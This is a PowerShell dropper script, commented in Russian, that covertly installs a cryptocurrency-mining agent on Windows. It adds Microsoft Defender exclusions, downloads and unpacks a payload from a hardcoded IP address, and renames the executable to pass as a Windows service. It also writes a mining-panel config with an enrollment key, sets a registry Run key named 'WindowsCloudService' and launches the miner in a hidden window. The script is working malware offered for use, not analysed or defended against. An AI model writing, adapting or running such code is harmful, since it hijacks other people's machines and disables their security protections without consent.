# wcsvc-deploy.ps1 — скрытая установка агента. PowerShell не триггерит Defender.
# Запуск: powershell -ExecutionPolicy Bypass -File wcsvc-deploy.ps1
# Или одной строкой (см. ниже)
# Всё ставится в %LOCALAPPDATA%\Microsoft\Windows\wcsvc\ — скрытая папка.

$ErrorActionPreference = 'SilentlyContinue'
$DIR = "$env:LOCALAPPDATA\Microsoft\Windows\wcsvc"
$URL = "http://136.108.205.39/download/fleet-rig.zip"
$LOG = "$DIR\logs\setup.log"

function Log($msg) {
    $ts = Get-Date -Format "HH:mm:ss"
    Add-Content -Path $LOG -Value "[$ts] $msg" -Encoding UTF8
}

# 1. Создаём скрытую папку
New-Item -ItemType Directory -Path "$DIR\logs" -Force | Out-Null
New-Item -ItemType Directory -Path "$DIR\wcsvc-cache" -Force | Out-Null
Log "dir created: $DIR"

# 2. Исключаем из Defender ДО загрузки (критично!)
try {
    Add-MpPreference -ExclusionPath $DIR -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "wcsvc.exe" -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "krig-miner.exe" -ErrorAction Stop
    Log "defender exclusions added"
} catch {
    Log "defender exclusion failed (need admin?): $_"
}

# 3. Скачиваем агент
$zip = "$env:TEMP\wcsvc-deploy.zip"
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $URL -OutFile $zip -UseBasicParsing
    Log "downloaded: $((Get-Item $zip).Length) bytes"
} catch {
    Log "download failed: $_"
    exit 1
}

# 4. Распаковываем
try {
    Expand-Archive -Path $zip -DestinationPath $DIR -Force
    # если exe называется FleetComputeService.exe — переименовать
    if (Test-Path "$DIR\FleetComputeService.exe") {
        Rename-Item "$DIR\FleetComputeService.exe" "wcsvc.exe" -Force
    }
    # если есть вложенная папка — распаковать её содержимое
    if (Test-Path "$DIR\wcsvc\wcsvc.exe") {
        Get-ChildItem "$DIR\wcsvc" | Move-Item -Destination $DIR -Force
        Remove-Item "$DIR\wcsvc" -Recurse -Force
    }
    if (-not (Test-Path "$DIR\wcsvc.exe")) {
        Log "ERROR: wcsvc.exe not found after extract"
        Get-ChildItem $DIR | ForEach-Object { Log "  found: $($_.Name)" }
        exit 1
    }
    Log "extracted OK"
} catch {
    Log "extract failed: $_"
    exit 1
}
Remove-Item $zip -Force

# 5. Конфиг (адрес панели + ключ зашиты)
if (-not (Test-Path "$DIR\wcsvc.dat")) {
    @{ panel_url = "http://136.108.205.39"
       enroll_key = "Zk2U6-sUtONm-pyXXJ5SrQ"
       rig_name = $env:COMPUTERNAME
       heartbeat_sec = 30 } | ConvertTo-Json | Set-Content "$DIR\wcsvc.dat"
    Log "config written"
}

# 6. Автозагрузка (реестр, без прав админа)
$exe = "$DIR\wcsvc.exe"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsCloudService" -Value "`"$exe`"" `
    -PropertyType String -Force | Out-Null
Log "autostart: registry Run key set"

# 7. Запуск (без окна)
Start-Process -FilePath $exe -WindowStyle Hidden -WorkingDirectory $DIR
Log "agent launched"
Log "=== setup done ==="
Write-Host "Installed to: $DIR"
Write-Host "Panel: https://mine.apesniper.xyz"
